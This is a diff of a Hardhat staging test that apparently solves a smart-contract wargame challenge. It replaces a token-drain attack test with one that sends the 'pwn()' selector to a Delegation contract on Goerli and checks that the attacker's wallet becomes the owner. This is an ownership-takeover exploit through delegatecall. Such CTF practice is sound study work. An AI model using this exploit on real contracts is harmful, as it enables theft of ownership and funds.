@@ -1,44 +1,47 @@
 import { assert } from "chai"
-import { network, ethers, getNamedAccounts } from "hardhat"
+import { network, ethers} from "hardhat"
 import { developmentChains, networkConfig } from "../../helper-hardhat-config"
-import { Attack, Token } from "../../typechain-types"
+import { Delegation } from "../../typechain-types"
 import "dotenv/config"
-import abi from "../../artifacts/contracts/Token.sol/Token.json"
+import abi from "../../artifacts/contracts/Delegation.sol/Delegation.json"
+
 
 const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL
-
+const PRIVATE_KEY = String(process.env.PRIVATE_KEY) 
 
 developmentChains.includes(network.name)
     ? describe.skip
     : describe("Token hack staging", function () {
         let provider: any 
-        let hacker: any 
-        let attack: Attack
-        let token: Token
+        let delegation: Delegation
         let addressContract: string
+        let gas_limit:string
+        let wallet:any
+        let data:any
 
         beforeEach(async() => {
-            provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL)
-            hacker = (await getNamedAccounts()).hacker
-            
+            provider =  new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
+            wallet  = new ethers.Wallet(PRIVATE_KEY,provider)
+            const functionSignature = 'pwn()';
+            data = ethers.utils.id(functionSignature);
+
             addressContract = networkConfig[network.config.chainId!]["contractAddress"]!
-            
-            attack = await ethers.getContract("Attack",hacker)
-            token = new ethers.Contract(addressContract,abi.abi, hacker)
+            delegation = new ethers.Contract(addressContract,abi.abi, wallet)
+            gas_limit = "0x300000" // 300.000
 
         })
         describe("Hack", function() {
             it("Check start balance", async() => {
-                let balance = (await token.balanceOf(hacker.address)).toString()
-                assert.equal(balance,"20");
-            })
-            it("Out all money",async() => {
-                const tx = await attack.attack()
-                await provider.waitForTransaction(tx.hash,1)
                 
-                let balance = (await token.balanceOf(hacker.address)).toString()
-                let totalSupply = (await token.totalSupply()).toString()
-                assert.equal(balance, totalSupply)
-            } )
+                const tx = await wallet.sendTransaction({ 
+                    from: wallet.address,
+                    to: addressContract,
+                    data: data,
+                    gasLimit: ethers.utils.hexlify(gas_limit)
+                })
+                await provider.waitForTransaction(tx.hash,1)
+                let owner = await delegation.owner()
+                assert.equal(owner, wallet.address)
+            })  
         })
     })
